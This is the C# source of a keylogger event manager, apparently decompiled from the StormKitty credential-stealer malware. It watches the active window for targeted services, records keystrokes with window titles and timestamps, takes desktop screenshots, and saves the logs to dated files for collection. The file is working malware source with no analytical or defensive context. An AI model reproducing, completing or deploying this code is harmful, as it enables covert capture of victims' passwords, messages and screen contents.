using System;
using System.IO;
using Stealer;
using StormKitty;

namespace Keylogger
{
	// Token: 0x0200003B RID: 59
	internal sealed class EventManager
	{
		// Token: 0x060000F4 RID: 244 RVA: 0x000086A0 File Offset: 0x000068A0
		public static void Action()
		{
			if (EventManager.Detect())
			{
				Keylogger.KeyLogs = string.Concat(new string[]
				{
					Keylogger.KeyLogs,
					"\n\n### ",
					WindowManager.ActiveWindow,
					" ### (",
					DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"),
					")\n"
				});
				DesktopScreenshot.Make(EventManager.KeyloggerDirectory);
				Keylogger.KeyloggerEnabled = true;
				return;
			}
			EventManager.SendKeyLogs();
			Keylogger.KeyloggerEnabled = false;
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x00008720 File Offset: 0x00006920
		private static bool Detect()
		{
			foreach (string value in Config.KeyloggerServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000875C File Offset: 0x0000695C
		private static void SendKeyLogs()
		{
			if (Keylogger.KeyLogs.Length < 45 || string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
			{
				return;
			}
			string path = EventManager.KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
			if (!Directory.Exists(EventManager.KeyloggerDirectory))
			{
				Directory.CreateDirectory(EventManager.KeyloggerDirectory);
			}
			File.WriteAllText(path, Keylogger.KeyLogs);
			Keylogger.KeyLogs = "";
		}

		// Token: 0x04000060 RID: 96
		private static string KeyloggerDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\keylogger\\" + DateTime.Now.ToString("yyyy-MM-dd"));
	}
}
